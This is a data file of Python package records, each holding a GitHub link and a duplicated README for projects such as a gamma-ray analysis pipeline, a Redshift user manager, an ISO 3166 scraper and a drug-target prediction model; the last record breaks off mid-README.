asgardpy,https://github.com/chaimain/asgardpy,29,2164,2164,"# asgardpy [![Build Status](https://github.com/chaimain/asgardpy/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/chaimain/asgardpy/actions?query=branch%3Amain) [![gammapy](https://img.shields.io/badge/powered%20by-gammapy-orange.svg?style=flat)](https://www.gammapy.org/) [![astropy](http://img.shields.io/badge/powered%20by-AstroPy-orange.svg?style=flat)](http://www.astropy.org/)
## Analysis Software for GAmma-Ray Data in Python

'User-friendly' configuration-centred pipeline built over [Gammapy](https://github.com/gammapy/gammapy) to allow for easy simultaneous analysis of various datasets of different formats.
Example: 3D Fermi-LAT (with various source models in the Region of Interest stored in XML file) + 1D energy-dependent selection cut MAGIC/LST [PointSkyRegion geometry for ON region] + 1D fixed-cut VERITAS [CircleSkyRegion geometry for ON region].

Follow the documentation at https://asgardpy.readthedocs.io/en/latest/ for the main functionality of this pipeline.
Follow the [Gammapy v1.0](https://docs.gammapy.org/1.0/) documentation for understanding the core Gammapy objects.

The various Data Levels	used here follow the descriptions suggested by [GADF v0.3](https://gamma-astro-data-formats.readthedocs.io/en/latest/) and CTAO Data Model

# Pipeline development

The pipeline was developed with first testing with Fermi-LAT ([enrico](https://enrico.readthedocs.io/en/latest/) and [fermipy](https://fermipy.readthedocs.io/en/latest/)) files and LST-1 ([cta-lstchain](https://cta-observatory.github.io/cta-lstchain/)) DL3 files (with energy-dependent selection cuts) for point-like sources. 
The pipeline can be further expanded to support more types of DL3 files of gamma-ray instruments.

An example of configuration file that can be used with asgardpy can be found at ``asgardpy/config/template.yaml``
Examples of usage of asgardpy is shown in jupyter notebooks in ``notebooks/`` but as there are no public test data included with the pipeline yet, the results are empty.

# Pipeline Template

Pipeline generated based on the template by [python-package-template](https://github.com/allenai/python-package-template).
","# asgardpy [![Build Status](https://github.com/chaimain/asgardpy/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/chaimain/asgardpy/actions?query=branch%3Amain) [![gammapy](https://img.shields.io/badge/powered%20by-gammapy-orange.svg?style=flat)](https://www.gammapy.org/) [![astropy](http://img.shields.io/badge/powered%20by-AstroPy-orange.svg?style=flat)](http://www.astropy.org/)
## Analysis Software for GAmma-Ray Data in Python

'User-friendly' configuration-centred pipeline built over [Gammapy](https://github.com/gammapy/gammapy) to allow for easy simultaneous analysis of various datasets of different formats.
Example: 3D Fermi-LAT (with various source models in the Region of Interest stored in XML file) + 1D energy-dependent selection cut MAGIC/LST [PointSkyRegion geometry for ON region] + 1D fixed-cut VERITAS [CircleSkyRegion geometry for ON region].

Follow the documentation at https://asgardpy.readthedocs.io/en/latest/ for the main functionality of this pipeline.
Follow the [Gammapy v1.0](https://docs.gammapy.org/1.0/) documentation for understanding the core Gammapy objects.

The various Data Levels	used here follow the descriptions suggested by [GADF v0.3](https://gamma-astro-data-formats.readthedocs.io/en/latest/) and CTAO Data Model

# Pipeline development

The pipeline was developed with first testing with Fermi-LAT ([enrico](https://enrico.readthedocs.io/en/latest/) and [fermipy](https://fermipy.readthedocs.io/en/latest/)) files and LST-1 ([cta-lstchain](https://cta-observatory.github.io/cta-lstchain/)) DL3 files (with energy-dependent selection cuts) for point-like sources. 
The pipeline can be further expanded to support more types of DL3 files of gamma-ray instruments.

An example of configuration file that can be used with asgardpy can be found at ``asgardpy/config/template.yaml``
Examples of usage of asgardpy is shown in jupyter notebooks in ``notebooks/`` but as there are no public test data included with the pipeline yet, the results are empty.

# Pipeline Template

Pipeline generated based on the template by [python-package-template](https://github.com/allenai/python-package-template).
",chaimain/asgardpy
grun-js,https://github.com/Leviathangk/runjs,0,311,311,"# 介绍

调用 node 执行 js ，可指定编码格式

# 安装

```
pip install -U grun_js
```

# 示例

```
    # run_js = RunJs(path='test.js')
    run_js = RunJs(content='''
        function getCookie(){
            return arguments
        }
    ''')
    result = run_js.run('getCookie', 'Gk')
    print(result)
```
","# 介绍

调用 node 执行 js ，可指定编码格式

# 安装

```
pip install -U grun_js
```

# 示例

```
    # run_js = RunJs(path='test.js')
    run_js = RunJs(content='''
        function getCookie(){
            return arguments
        }
    ''')
    result = run_js.run('getCookie', 'Gk')
    print(result)
```
",leviathangk/runjs
msgraphlib,https://github.com/pypa/sampleproject,2,18,18,"A sample project
","A sample project
",pypa/sampleproject
super-duper-waddle,https://github.com/entelecheia/super-duper-waddle,0,1678,1648,"# Super duper waddle

[![pypi-image]][pypi-url]
[![license-image]][license-url]
[![version-image]][release-url]
[![release-date-image]][release-url]
[![jupyter-book-image]][docs-url]

<!-- Links: -->
[pypi-image]: https://img.shields.io/pypi/v/super-duper-waddle
[license-image]: https://img.shields.io/github/license/entelecheia/super-duper-waddle
[license-url]: https://github.com/entelecheia/super-duper-waddle/blob/main/LICENSE
[version-image]: https://img.shields.io/github/v/release/entelecheia/super-duper-waddle?sort=semver
[release-date-image]: https://img.shields.io/github/release-date/entelecheia/super-duper-waddle
[release-url]: https://github.com/entelecheia/super-duper-waddle/releases
[jupyter-book-image]: https://jupyterbook.org/en/stable/_images/badge.svg

[repo-url]: https://github.com/entelecheia/super-duper-waddle
[pypi-url]: https://pypi.org/project/super-duper-waddle
[docs-url]: https://entelecheia.github.io/super-duper-waddle
[changelog]: https://github.com/entelecheia/super-duper-waddle/blob/main/CHANGELOG.md
[contributing guidelines]: https://github.com/entelecheia/super-duper-waddle/blob/main/CONTRIBUTING.md
<!-- Links: -->

Super duper waddle projet

- Documentation: [https://entelecheia.github.io/super-duper-waddle][docs-url]
- GitHub: [https://github.com/entelecheia/super-duper-waddle][repo-url]
- PyPI: [https://pypi.org/project/super-duper-waddle][pypi-url]

Super duper waddle pypi project

## Changelog

See the [CHANGELOG] for more information.

## Contributing

Contributions are welcome! Please see the [contributing guidelines] for more information.

## License

This project is released under the [MIT License][license-url].

","# Super duper waddle

[![pypi-image]][pypi-url]
[![license-image]][license-url]
[![version-image]][release-url]
[![release-date-image]][release-url]
[![jupyter-book-image]][docs-url]


[pypi-image]: https://img.shields.io/pypi/v/super-duper-waddle
[license-image]: https://img.shields.io/github/license/entelecheia/super-duper-waddle
[license-url]: https://github.com/entelecheia/super-duper-waddle/blob/main/LICENSE
[version-image]: https://img.shields.io/github/v/release/entelecheia/super-duper-waddle?sort=semver
[release-date-image]: https://img.shields.io/github/release-date/entelecheia/super-duper-waddle
[release-url]: https://github.com/entelecheia/super-duper-waddle/releases
[jupyter-book-image]: https://jupyterbook.org/en/stable/_images/badge.svg

[repo-url]: https://github.com/entelecheia/super-duper-waddle
[pypi-url]: https://pypi.org/project/super-duper-waddle
[docs-url]: https://entelecheia.github.io/super-duper-waddle
[changelog]: https://github.com/entelecheia/super-duper-waddle/blob/main/CHANGELOG.md
[contributing guidelines]: https://github.com/entelecheia/super-duper-waddle/blob/main/CONTRIBUTING.md


Super duper waddle projet

- Documentation: [https://entelecheia.github.io/super-duper-waddle][docs-url]
- GitHub: [https://github.com/entelecheia/super-duper-waddle][repo-url]
- PyPI: [https://pypi.org/project/super-duper-waddle][pypi-url]

Super duper waddle pypi project

## Changelog

See the [CHANGELOG] for more information.

## Contributing

Contributions are welcome! Please see the [contributing guidelines] for more information.

## License

This project is released under the [MIT License][license-url].

",entelecheia/super-duper-waddle
badgescale-ys-plt,https://github.com/pypa/sampleproject/,3,790,790,"# BadgeScale_YS_PLT

#### 介绍
badgescale-ys-plt 全称是 badge scale yunsi production line tool，解释是 专门针对云思工牌整机的生产测试工具，工作在上位机PC Windows上。

#### 软件架构
软件架构说明


#### 安装教程

1.  xxxx
2.  xxxx
3.  xxxx

#### 使用说明

1.  xxxx
2.  xxxx
3.  xxxx

#### 参与贡献

1.  Fork 本仓库
2.  新建 Feat_xxx 分支
3.  提交代码
4.  新建 Pull Request


#### 特技

1.  使用 Readme\_XXX.md 来支持不同的语言，例如 Readme\_en.md, Readme\_zh.md
2.  Gitee 官方博客 [blog.gitee.com](https://blog.gitee.com)
3.  你可以 [https://gitee.com/explore](https://gitee.com/explore) 这个地址来了解 Gitee 上的优秀开源项目
4.  [GVP](https://gitee.com/gvp) 全称是 Gitee 最有价值开源项目，是综合评定出的优秀开源项目
5.  Gitee 官方提供的使用手册 [https://gitee.com/help](https://gitee.com/help)
6.  Gitee 封面人物是一档用来展示 Gitee 会员风采的栏目 [https://gitee.com/gitee-stars/](https://gitee.com/gitee-stars/)
","# BadgeScale_YS_PLT

#### 介绍
badgescale-ys-plt 全称是 badge scale yunsi production line tool，解释是 专门针对云思工牌整机的生产测试工具，工作在上位机PC Windows上。

#### 软件架构
软件架构说明


#### 安装教程

1.  xxxx
2.  xxxx
3.  xxxx

#### 使用说明

1.  xxxx
2.  xxxx
3.  xxxx

#### 参与贡献

1.  Fork 本仓库
2.  新建 Feat_xxx 分支
3.  提交代码
4.  新建 Pull Request


#### 特技

1.  使用 Readme\_XXX.md 来支持不同的语言，例如 Readme\_en.md, Readme\_zh.md
2.  Gitee 官方博客 [blog.gitee.com](https://blog.gitee.com)
3.  你可以 [https://gitee.com/explore](https://gitee.com/explore) 这个地址来了解 Gitee 上的优秀开源项目
4.  [GVP](https://gitee.com/gvp) 全称是 Gitee 最有价值开源项目，是综合评定出的优秀开源项目
5.  Gitee 官方提供的使用手册 [https://gitee.com/help](https://gitee.com/help)
6.  Gitee 封面人物是一档用来展示 Gitee 会员风采的栏目 [https://gitee.com/gitee-stars/](https://gitee.com/gitee-stars/)
",pypa/sampleproject
redshift-user-manager,https://github.com/henryivesjones/redshift-user-manager,4,5300,5300,"# redshift-user-manager
Redshift User Manager (RUM) is a user manager for AWS Redshift.
It can create/delete users and grant/revoke permissions from those users.
RUM works with a roles and permissions model which are defined in a config YAML file.
Permissions define the actual access to schemas/tables.
Permissions are then assigned to roles, and roles can be granted to users.

# Installation
RUM is installed via pip and requires python >= 3.6

```
pip install redshift-user-manager
```
Once installed it can be invoked on the command line with the `rum` command.
```
rum version
```

# Config YAML
RUM must be given a config yaml file which defines: the database that it is operating on, the permissions definitions, and role definitions.
```yaml
host: a-database.abcd1234.us-east-1.redshift.amazonaws.com
port: 5439
database: a-database
roles:
  read-all:
    permissions:
      - r-all
  read-write-all:
    permissions:
      - rw-all
permissions:
  r-all:
    level: READ
    entities: ""*""
  rw-all:
    level: READ
    entities: ""*""
```

## Permissions
A permission can give access to all tables and schemas, all tables within schema(s), or to specific schema/tables.
```yaml
permissions:
  r-all:
    level: READ
    entities: ""*""
  rw-all:
    level: READWRITE
    entities: ""*""
  rw-schema-a:
    level: READWRITE
    entities:
      - schema-a.*
  r-table-a:
    level: READ
    entities:
      - schema-a.table-a
  rw-table-a-table-b:
    level: READWRITE
    entities:
      - schema-a.table-a
      - schema-a.table-b
```
### Level
Each permission is given a level: (`READ` or `READWRITE`). This level determines the level of access given to the given entities.

`READ` gives `SELECT` access to the given entities. `READWRITE` gives `ALL` access to the given entities.

### Entities
Each permission must be given value(s) for the entities field. The possible values are `*` or a list of `schema.*` or `schema.table`.
 - `*` will give the given permission level to all tables within all schemas. As well as give default permissions to new entities created by the user which granted these permissions. This is equivalent to explicitly defining `schema.*` for all schemas in the database, and internally executes the same queries as `schema.*`.

 - `schema.*` will give the given permission level to all tables within a specific schemas. As well as give default permissions to new entities created by the user which granted these permissions within that schema.
```sql
GRANT {SELECT|ALL} ON SCHEMA {schema} TO {user_name};
GRANT {USAGE|ALL} ON ALL TABLES IN SCHEMA {schema} TO {user_name};
ALTER DEFAULT PRIVILEGES IN SCHEMA {schema} GRANT {SELECT|ALL} ON TABLES TO {user_name};
```

 - `schema.table` will give the given permission level to a specific table within a specific schema.
```sql
GRANT USAGE ON SCHEMA {schema} TO {user_name};
GRANT {SELECT|ALL} ON {schema}.{table} TO {user_name};
```

## Roles
Roles are lists of permissions that can then be granted or revoked from specific users. Roles are defined in the config YAML.
```yaml
roles:
  developer:
    permissions:
      - r-all
      - rw-schema-a
  read-only:
    permissions:
       - r-all
```
This example config defines two roles: `developer` and `read-only`.

# Usage
RUM is invoked via the command line with the command `rum`. In order to function RUM must be given 4 pieces of information either by environment variable or passed in as a CLI argument:
 - `REDSHIFT_USER_MANAGER_USERNAME`: The username used to connect to the database. This user must be a superuser and is the user that is used to create/grant permissions in the database.
 - `REDSHIFT_USER_MANAGER_PASSWORD`: The password used to connect to the database.
 - `REDSHIFT_USER_MANAGER_CONFIG_FILE`: A path to the `config.yaml` file. Defaults to a file named `redshift-user-manager-config.yaml` in the current working directory.
 - `REDSHIFT_USER_MANAGER_STATE_FILE`: A path to the `state.yaml` file which holds the state for RUM. Defaults to a file named `state.yaml` in the current working directory.

I recommend putting both the state.yaml and config.yaml into source control so that any changes can be change-tracked.

## Create a user.
You can choose to have RUM generate a random password, or you can give it a password to use for the user. When creating a role, you can optionally pass in roles that you want to grant this user. Roles can be granted or revoked in the future as well.

For example, to create a user `test-user` with the password `1234`, and grant it the `read-all` role:
```bash
rum create test-user -p 1234 -r read-all
```

## Delete a user.
When deleting users from redshift, all permissions must first be revoked. RUM handles this for you.

For example, to delete the user `test-user`:
```bash
rum delete test-user
```

## Grant/Revoke roles for/from a user.
Roles can be granted and revoked from a user.

For example, we will first grant the role `r-all` to the user `test-user`, and then revoke it.
```bash
rum grant test-user -r r-all
rum revoke test-user -r r-all
```

## Refresh a user or all users permissions.
When new schemas or tables are added or permissions within the config.yaml change, it can be useful to re-apply all permissions to a single, or all users:

```bash
rum refresh test-user
rum refresh-all


```
","# redshift-user-manager
Redshift User Manager (RUM) is a user manager for AWS Redshift.
It can create/delete users and grant/revoke permissions from those users.
RUM works with a roles and permissions model which are defined in a config YAML file.
Permissions define the actual access to schemas/tables.
Permissions are then assigned to roles, and roles can be granted to users.

# Installation
RUM is installed via pip and requires python >= 3.6

```
pip install redshift-user-manager
```
Once installed it can be invoked on the command line with the `rum` command.
```
rum version
```

# Config YAML
RUM must be given a config yaml file which defines: the database that it is operating on, the permissions definitions, and role definitions.
```yaml
host: a-database.abcd1234.us-east-1.redshift.amazonaws.com
port: 5439
database: a-database
roles:
  read-all:
    permissions:
      - r-all
  read-write-all:
    permissions:
      - rw-all
permissions:
  r-all:
    level: READ
    entities: ""*""
  rw-all:
    level: READ
    entities: ""*""
```

## Permissions
A permission can give access to all tables and schemas, all tables within schema(s), or to specific schema/tables.
```yaml
permissions:
  r-all:
    level: READ
    entities: ""*""
  rw-all:
    level: READWRITE
    entities: ""*""
  rw-schema-a:
    level: READWRITE
    entities:
      - schema-a.*
  r-table-a:
    level: READ
    entities:
      - schema-a.table-a
  rw-table-a-table-b:
    level: READWRITE
    entities:
      - schema-a.table-a
      - schema-a.table-b
```
### Level
Each permission is given a level: (`READ` or `READWRITE`). This level determines the level of access given to the given entities.

`READ` gives `SELECT` access to the given entities. `READWRITE` gives `ALL` access to the given entities.

### Entities
Each permission must be given value(s) for the entities field. The possible values are `*` or a list of `schema.*` or `schema.table`.
 - `*` will give the given permission level to all tables within all schemas. As well as give default permissions to new entities created by the user which granted these permissions. This is equivalent to explicitly defining `schema.*` for all schemas in the database, and internally executes the same queries as `schema.*`.

 - `schema.*` will give the given permission level to all tables within a specific schemas. As well as give default permissions to new entities created by the user which granted these permissions within that schema.
```sql
GRANT {SELECT|ALL} ON SCHEMA {schema} TO {user_name};
GRANT {USAGE|ALL} ON ALL TABLES IN SCHEMA {schema} TO {user_name};
ALTER DEFAULT PRIVILEGES IN SCHEMA {schema} GRANT {SELECT|ALL} ON TABLES TO {user_name};
```

 - `schema.table` will give the given permission level to a specific table within a specific schema.
```sql
GRANT USAGE ON SCHEMA {schema} TO {user_name};
GRANT {SELECT|ALL} ON {schema}.{table} TO {user_name};
```

## Roles
Roles are lists of permissions that can then be granted or revoked from specific users. Roles are defined in the config YAML.
```yaml
roles:
  developer:
    permissions:
      - r-all
      - rw-schema-a
  read-only:
    permissions:
       - r-all
```
This example config defines two roles: `developer` and `read-only`.

# Usage
RUM is invoked via the command line with the command `rum`. In order to function RUM must be given 4 pieces of information either by environment variable or passed in as a CLI argument:
 - `REDSHIFT_USER_MANAGER_USERNAME`: The username used to connect to the database. This user must be a superuser and is the user that is used to create/grant permissions in the database.
 - `REDSHIFT_USER_MANAGER_PASSWORD`: The password used to connect to the database.
 - `REDSHIFT_USER_MANAGER_CONFIG_FILE`: A path to the `config.yaml` file. Defaults to a file named `redshift-user-manager-config.yaml` in the current working directory.
 - `REDSHIFT_USER_MANAGER_STATE_FILE`: A path to the `state.yaml` file which holds the state for RUM. Defaults to a file named `state.yaml` in the current working directory.

I recommend putting both the state.yaml and config.yaml into source control so that any changes can be change-tracked.

## Create a user.
You can choose to have RUM generate a random password, or you can give it a password to use for the user. When creating a role, you can optionally pass in roles that you want to grant this user. Roles can be granted or revoked in the future as well.

For example, to create a user `test-user` with the password `1234`, and grant it the `read-all` role:
```bash
rum create test-user -p 1234 -r read-all
```

## Delete a user.
When deleting users from redshift, all permissions must first be revoked. RUM handles this for you.

For example, to delete the user `test-user`:
```bash
rum delete test-user
```

## Grant/Revoke roles for/from a user.
Roles can be granted and revoked from a user.

For example, we will first grant the role `r-all` to the user `test-user`, and then revoke it.
```bash
rum grant test-user -r r-all
rum revoke test-user -r r-all
```

## Refresh a user or all users permissions.
When new schemas or tables are added or permissions within the config.yaml change, it can be useful to re-apply all permissions to a single, or all users:

```bash
rum refresh test-user
rum refresh-all


```
",henryivesjones/redshift-user-manager
mindmate,https://github.com/yalattas/mindmate,4,341,341,"MindMate is a powerful command-line tool that harnesses the capabilities of state-of-the-art artificial intelligence platforms to offer a wide range of use-cases to developers. With MindMate, developers can easily leverage advanced natural language processing (NLP) and machine learning (ML) functionalities to enable various applications


","MindMate is a powerful command-line tool that harnesses the capabilities of state-of-the-art artificial intelligence platforms to offer a wide range of use-cases to developers. With MindMate, developers can easily leverage advanced natural language processing (NLP) and machine learning (ML) functionalities to enable various applications


",yalattas/mindmate
iso3166-scraper,https://github.com/soulwing/iso3166-scraper,3,2292,2292,"iso3166-scraper
===============

A simple utility for scraping ISO-3166 country data from a [Wikipedia
article](https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes) that 
contains all current country codes, names, etc.

In a recent project, I had a need for the ISO 3166 country code data and was
disappointed to discover that there really wasn't a good free source for 
obtaining the data in structured form. I'm sure there's some place where I 
could spend money with ISO to get this data, but that's not a great option 
for an open source project with no revenue stream for such expenses.

However, the above referenced Wikipedia article was pretty cleanly structured 
and easy enough to scrape. The data changes infrequently, so occasionally 
running this utility to get the latest data seems like a decent compromise.
Maybe you'll find it useful too.

This utility scrapes the web page, and outputs the country code data in
JSON and YAML formats.

In addition to the basic country data, the script maps the country codes
to the corresponding Unicode code points for each country's flag and
includes the appropriate escape sequences in a string property of the
output data in every format.

This tool is built using some excellent open source components that make
creating tools like this really easy.

* [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/) -- HTML
  page scraping
* [Requests](https://requests.readthedocs.io/en/latest/) -- HTTP for Humans
* [ruamel.yaml](https://pypi.org/project/ruamel.yaml/) -- YAML reader/writer


Installation
------------

This package is available for installation via PyPI and can therefore be 
installed using *pip* as follows.

```bash
python3 -m pip install iso3166-scraper
```

Usage
-----

After installation, you can simply run it.

```
$ iso3166-scraper
retrieving https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes
writing JSON file: ./iso3166.json
writing YAML file: ./iso3166.yml
```

By default, it fetches the Wikipedia article, scrapes the ISO 3166 country
data from the page, and produces JSON and YAML output files in the current
directory. Using command line options, you can select which output format
you want and where to put it. To see all the options, use

```bash
iso3166-scraper --help
```

","iso3166-scraper
===============

A simple utility for scraping ISO-3166 country data from a [Wikipedia
article](https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes) that 
contains all current country codes, names, etc.

In a recent project, I had a need for the ISO 3166 country code data and was
disappointed to discover that there really wasn't a good free source for 
obtaining the data in structured form. I'm sure there's some place where I 
could spend money with ISO to get this data, but that's not a great option 
for an open source project with no revenue stream for such expenses.

However, the above referenced Wikipedia article was pretty cleanly structured 
and easy enough to scrape. The data changes infrequently, so occasionally 
running this utility to get the latest data seems like a decent compromise.
Maybe you'll find it useful too.

This utility scrapes the web page, and outputs the country code data in
JSON and YAML formats.

In addition to the basic country data, the script maps the country codes
to the corresponding Unicode code points for each country's flag and
includes the appropriate escape sequences in a string property of the
output data in every format.

This tool is built using some excellent open source components that make
creating tools like this really easy.

* [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/) -- HTML
  page scraping
* [Requests](https://requests.readthedocs.io/en/latest/) -- HTTP for Humans
* [ruamel.yaml](https://pypi.org/project/ruamel.yaml/) -- YAML reader/writer


Installation
------------

This package is available for installation via PyPI and can therefore be 
installed using *pip* as follows.

```bash
python3 -m pip install iso3166-scraper
```

Usage
-----

After installation, you can simply run it.

```
$ iso3166-scraper
retrieving https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes
writing JSON file: ./iso3166.json
writing YAML file: ./iso3166.yml
```

By default, it fetches the Wikipedia article, scrapes the ISO 3166 country
data from the page, and produces JSON and YAML output files in the current
directory. Using command line options, you can select which output format
you want and where to put it. To see all the options, use

```bash
iso3166-scraper --help
```

",soulwing/iso3166-scraper
text-box-wrapper,https://github.com/Hootrix/text-box-wrapper,1,2132,2132,"# Text Box Wrapper

A simple Python package to wrap text with ASCII art or other characters. It also supports custom alignment (left, center, or right) and can be used as a decorator.

## Installation

Install the package using pip:

```bash
pip install text-box-wrapper
```

# Usage
## Basic usage
Import the `wrap_with_ascii_art` function and use it to wrap your text:
```python
from text_box_wrapper import wrap_with_ascii_art

text = ""Hello, World!""
wrapped_text = wrap_with_ascii_art(text)
print(wrapped_text)

```
## Example output:

```
###########################################
###########################################
#####                                 #####
#####                                 #####
#####          Hello, World!          #####
#####                                 #####
#####                                 #####
###########################################
###########################################
```

# Customizing the wrapper
You can customize the padding, border string, 
and alignment:
```
from text_box_wrapper import wrap_with_ascii_art

text = ""你好，成都""
border_string = ""#""
wrapped_text = wrap_with_ascii_art(text, min_padding=5, vertical_padding=2, border_string=border_string, alignment=""center"")
print(wrapped_text)

```
## Example output:

```
######################
#                    #
#                    #
#     你好，成都       #
#                    #
#                    #
######################
```

# Using the decorator
You can also use the `wrap` decorator to automatically wrap the output of a function:

```python3
from text_box_wrapper import wrap

@wrap(min_padding=7, vertical_padding=1, border_string=""*"", alignment=""center"")
def greet(name):
    return f""Hello, {name}!""

print(greet(""John""))

```

## Example output:

```
****************************
*                          *
*       Hello, John!       *
*                          *
****************************
```

# Contributing
Feel free to submit issues or pull requests if you have any suggestions, improvements, or bug reports.

# License

This project is licensed under the [MIT License.](LICENSE)

","# Text Box Wrapper

A simple Python package to wrap text with ASCII art or other characters. It also supports custom alignment (left, center, or right) and can be used as a decorator.

## Installation

Install the package using pip:

```bash
pip install text-box-wrapper
```

# Usage
## Basic usage
Import the `wrap_with_ascii_art` function and use it to wrap your text:
```python
from text_box_wrapper import wrap_with_ascii_art

text = ""Hello, World!""
wrapped_text = wrap_with_ascii_art(text)
print(wrapped_text)

```
## Example output:

```
###########################################
###########################################
#####                                 #####
#####                                 #####
#####          Hello, World!          #####
#####                                 #####
#####                                 #####
###########################################
###########################################
```

# Customizing the wrapper
You can customize the padding, border string, 
and alignment:
```
from text_box_wrapper import wrap_with_ascii_art

text = ""你好，成都""
border_string = ""#""
wrapped_text = wrap_with_ascii_art(text, min_padding=5, vertical_padding=2, border_string=border_string, alignment=""center"")
print(wrapped_text)

```
## Example output:

```
######################
#                    #
#                    #
#     你好，成都       #
#                    #
#                    #
######################
```

# Using the decorator
You can also use the `wrap` decorator to automatically wrap the output of a function:

```python3
from text_box_wrapper import wrap

@wrap(min_padding=7, vertical_padding=1, border_string=""*"", alignment=""center"")
def greet(name):
    return f""Hello, {name}!""

print(greet(""John""))

```

## Example output:

```
****************************
*                          *
*       Hello, John!       *
*                          *
****************************
```

# Contributing
Feel free to submit issues or pull requests if you have any suggestions, improvements, or bug reports.

# License

This project is licensed under the [MIT License.](LICENSE)

",hootrix/text-box-wrapper
conplex-dti,https://github.com/samsledje/ConPLex,14,3384,3384,"# 🚧🚧 Currently under construction 🚧🚧

# ConPLex

![ConPLex Schematic](assets/images/Fig2_Schematic.png)

[![ConPLex Releases](https://img.shields.io/github/v/release/samsledje/ConPLex?include_prereleases)](https://github.com/samsledje/ConPLex/releases)
[![PyPI](https://img.shields.io/pypi/v/conplex-dti)](https://pypi.org/project/conplex-dti/)
[![Documentation Status](https://readthedocs.org/projects/conplex/badge/?version=main)](https://conplex.readthedocs.io/en/main/?badge=main)
[![License](https://img.shields.io/github/license/samsledje/ConPLex)](https://github.com/samsledje/ConPLex/blob/main/LICENSE)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

 - [Homepage](http://conplex.csail.mit.edu)
 - [Documentation](https://d-script.readthedocs.io/en/main/)

## Abstract
Sequence-based prediction of drug-target interactions has the potential to accelerate drug discovery by complementing experimental screens. Such computational prediction needs to be generalizable and scalable while remaining sensitive to subtle variations in the inputs. However, current computational techniques fail to simultaneously meet these goals, often sacrificing performance on one to achieve the others. We develop a deep learning model, ConPLex, successfully leveraging the advances in pre-trained protein language models (""PLex"") and employing  a novel  protein-anchored contrastive co-embedding (""Con"") to outperform state-of-the-art approaches. ConPLex achieves high accuracy, broad adaptivity to unseen data, and specificity against decoy compounds. It makes predictions of binding based on the distance between learned representations, enabling predictions at the scale of massive compound libraries and the human proteome. Experimental testing of 19 kinase-drug interaction predictions validated 12 interactions, including four with sub-nanomolar affinity, plus a novel strongly-binding EPHB1 inhibitor ($K_D = 1.3nM$). Furthermore, ConPLex embeddings are interpretable, which enables us to visualize the drug-target embedding space and use embeddings to characterize the function of human cell-surface proteins. We anticipate ConPLex will facilitate novel drug discovery by making highly sensitive in-silico drug screening feasible at genome scale.

## Installation

### Install from PyPI
-----------------

```
$ pip install conplex-dti
```

### Compile from Source
-------------------

```
$ git clone https://github.com/samsledje/ConPLex.git
$ cd ConPLex
$ conda env create -n conplex python=3.9
$ make poetry-install
$ make install
```

## Usage

### Download benchmark data sets
```
$ ...
```

### Run benchmark training
```
$ conplex-dti train --run-id TestRun --config config/default_config.yaml
```

### Make predictions with a trained model
```
$ ...
```

### Visualize co-embedding space
```
$ ...
```

## Reference
If you use ConPLex, please cite [“Contrastive learning in protein language space predicts interactions between drugs and protein targets”](https://www.biorxiv.org/content/10.1101/2022.12.06.519374v1) by Rohit Singh*, Samuel Sledzieski*, Bryan Bryson, Lenore Cowen and Bonnie Berger, currently in press at PNAS.

```
TBD .bibtex citation
```

### Manuscript Code
Code used to generate results in the manuscript can be found in the [development repository](https://github.com/samsledje/ConPLex_dev)
","# 🚧🚧 Currently under construction 🚧🚧

# ConPLex

![ConPLex Schematic](assets/images/Fig2_Schematic.png)

[![ConPLex Releases](https://img.shields.io/github/v/release/samsledje/ConPLex?include_prereleases)](https://github.com/samsledje/ConPLex/releases)
[![PyPI](https://img.shields.io/pypi/v/conplex-dti)](https://pypi.org/project/conplex-dti/)
[![Documentation Status](https://readthedocs.org/projects/conplex/badge/?version=main)](https://conplex.readthedocs.io/en/main/?badge=main)
[![License](https://img.shields.io/github/license/samsledje/ConPLex)](https://github.com/samsledje/ConPLex/blob/main/LICENSE)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

 - [Homepage](http://conplex.csail.mit.edu)
 - [Documentation](https://d-script.readthedocs.io/en/main/)

## Abstract
Sequence-based prediction of drug-target interactions has the potential to accelerate drug discovery by complementing experimental screens. Such computational prediction needs to be generalizable and scalable while remaining sensitive to subtle variations in the inputs. However, current computational techniques fail to simultaneously meet these goals, often sacrificing performance on one to achieve the others. We develop a deep learning model, ConPLex, successfully leveraging the advances in pre-trained protein language models (""PLex"") and employing  a novel  protein-anchored contrastive co-embedding (""Con"") to outperform state-of-the-art approaches. ConPLex achieves high accuracy, broad adaptivity to unseen data, and specificity against decoy compounds. It makes predictions of binding based on the distance between learned representations, enabling predictions at the scale of massive compound libraries and the human proteome. Experimental testing of 19 kinase-drug interaction predictions validated 12 interactions, including four with sub-nanomolar affinity, plus a novel strongly-binding EPHB1 inhibitor ($K_D = 1.3nM$). Furthermore, ConPLex embeddings are interpretable, which enables us to visualize the drug-target embedding space and use embeddings to characterize the function of human cell-surface proteins. We anticipate ConPLex will facilitate novel drug discovery by making highly sensitive in-silico drug screening feasible at genome scale.

## Installation

### Install from PyPI
-----------------

```
$ pip install conplex-dti
```

### Compile from Source
-------------------

```
$ git clone https://github.com/samsledje/ConPLex.git
$ cd ConPLex
$ conda env create -n conplex python=3.9
$ make poetry-install
$ make install
```

## Usage

### Download benchmark data sets
```
$ ...
```

### Run benchmark training
```
$ conplex-dti train --run-id TestRun --config config/default_config.yaml
```

### Make predictions with a trained model
```
$ ...
```

### Visualize co-embedding space
```
$ ...
```

## Reference
If you use ConPLex, please cite [“Contrastive learning in protein language space predicts interactions between drugs and protein targets”](https://www.biorxiv.org/content/10.1101/2022.12.06.519374v1) by Rohit Singh*, Samuel Sledzieski*, Bryan Bryson, Lenore Cowen and Bonnie Berger, currently in press at PNAS.

```
TBD .bibtex citation
```

### Manuscript Code
Code used to generate results in the manuscript can be found in the [development repository](https://github.com/samsledje/ConPLex_dev)
",samsledje/conplex
fastshermanmorrison-pulsar,https://github.com/vhaasteren/fastshermanmorrison,0,668,668,"# FastShermanMorrison

![PyPI](https://img.shields.io/pypi/v/fastshermanmorrison-pulsar)
![Conda (channel only)](https://img.shields.io/conda/vn/conda-forge/fastshermanmorrison-pulsar)


Cython code to more quickly evaluate ShermanMorrison combinations as need by
kernel ecorr in Enterprise.

# Installation

The FastShermanMorrison add-on to Enterprise can be easily installed straight
from github using

```bash
